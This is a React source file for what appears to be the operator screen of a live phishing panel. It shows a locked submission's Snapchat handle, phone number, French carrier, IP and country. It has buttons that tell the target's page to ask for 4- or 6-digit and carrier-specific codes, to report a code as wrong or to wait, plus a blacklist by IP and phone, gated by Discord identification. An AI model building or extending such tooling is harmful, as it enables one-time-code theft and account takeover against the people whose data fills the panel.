import { useState } from "react";
import { motion } from "framer-motion";
import { Send, Hash, Ban, Clock, X, Ghost, Phone, MapPin, Globe } from "lucide-react";
import { base44 } from "@/api/base44Client";
import { t } from "@/components/buyer/i18n";

const opPill = {
  SFR: "bg-red-500/15 text-red-400 border border-red-500/30",
  Bouygues: "bg-blue-500/15 text-blue-400 border border-blue-500/30",
  Orange: "bg-orange-400/15 text-orange-400 border border-orange-400/30",
};

function formatFull(tel) {
  const d = String(tel || "").replace(/\D/g, "");
  return d.match(/.{1,2}/g)?.join(" ") || d;
}

export default function SubmissionActions({ sub, discord, lang, onDone }) {
  const [busy, setBusy] = useState(null);
  const [result, setResult] = useState("");

  const runAction = async (action) => {
    setBusy(action);
    setResult("");
    try {
      const res = await base44.functions.invoke("sendCode", { submissionId: sub.id, action, discord });
      if (res?.data?.discord_required) {
        setResult(lang === "fr" ? "Identification Discord requise" : "Discord identification required");
      } else {
        setResult(lang === "fr" ? "Action envoyée ✓" : "Action sent ✓");
        setTimeout(() => onDone?.(), 1200);
      }
    } catch (err) {
      setResult(err?.response?.data?.error || (lang === "fr" ? "Échec" : "Failed"));
    }
    setBusy(null);
  };

  const runBlacklist = async () => {
    setBusy("blacklist");
    setResult("");
    try {
      await base44.functions.invoke("blacklistUser", {
        ip: sub.ip_address,
        telephone: sub.telephone,
        submissionId: sub.id,
      });
      await base44.functions.invoke("sendCode", { submissionId: sub.id, action: "wrong", discord }).catch(() => {});
      setResult(lang === "fr" ? "Blacklisté ✓" : "Blacklisted ✓");
      setTimeout(() => onDone?.(), 1200);
    } catch (err) {
      setResult(err?.response?.data?.error || (lang === "fr" ? "Échec" : "Failed"));
    }
    setBusy(null);
  };

  const actions = [
    { key: "code_ready", label: t(lang, "code4"), icon: Send, cls: "bg-primary text-primary-foreground" },
    { key: "code6", label: t(lang, "code6"), icon: Hash, cls: "bg-purple-500 text-white" },
    { key: "code6sfr", label: t(lang, "code6sfr"), icon: Hash, cls: "bg-red-500 text-white" },
    { key: "code6orange", label: t(lang, "code6orange"), icon: Hash, cls: "bg-orange-500 text-white" },
    { key: "wrong", label: t(lang, "wrong"), icon: X, cls: "bg-red-500/15 text-red-400 border border-red-500/30" },
    { key: "wait", label: t(lang, "wait"), icon: Clock, cls: "bg-blue-500/15 text-blue-400 border border-blue-500/30" },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-card border border-border rounded-2xl p-5 shadow-xl shadow-black/40"
    >
      <div className="flex flex-wrap items-center gap-2 mb-4">
        <span className={`px-2.5 py-1 rounded-md text-[11px] font-semibold ${opPill[sub.operateur] || opPill.Bouygues}`}>
          {sub.operateur}
        </span>
        <span className="px-2.5 py-1 rounded-md text-[11px] font-semibold bg-primary/15 text-primary border border-primary/30">
          {t(lang, "lockedByYou")}
        </span>
      </div>

      <div className="space-y-2 mb-4">
        <div className="flex items-center gap-2">
          <Ghost className="w-4 h-4 text-muted-foreground" />
          <span className="text-base font-bold text-foreground">@{sub.snapchat}</span>
        </div>
        <div className="flex items-center gap-2">
          <Phone className="w-4 h-4 text-muted-foreground" />
          <span className="text-base font-mono text-foreground">{formatFull(sub.telephone)}</span>
        </div>
      </div>

      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground mb-4">
        {sub.ip_address && (
          <span className="flex items-center gap-1"><MapPin className="w-3 h-3" />{sub.ip_address}</span>
        )}
        {sub.country && sub.country !== "Inconnue" && (
          <span className="flex items-center gap-1"><Globe className="w-3 h-3" />{sub.country}</span>
        )}
      </div>

      <div className="grid grid-cols-2 gap-2">
        {actions.map((a) => {
          const Icon = a.icon;
          return (
            <button
              key={a.key}
              onClick={() => runAction(a.key)}
              disabled={!!busy}
              className={`flex items-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50 ${a.cls}`}
            >
              {busy === a.key ? (
                <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
              ) : (
                <Icon className="w-3.5 h-3.5" />
              )}
              {a.label}
            </button>
          );
        })}
        <button
          onClick={runBlacklist}
          disabled={!!busy}
          className="col-span-2 flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold bg-destructive/20 text-red-300 border border-destructive/40 transition-colors disabled:opacity-50"
        >
          {busy === "blacklist" ? (
            <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
          ) : (
            <Ban className="w-3.5 h-3.5" />
          )}
          {t(lang, "blacklist")}
        </button>
      </div>
      {result && <p className="text-center text-xs text-muted-foreground mt-3">{result}</p>}
    </motion.div>
  );
}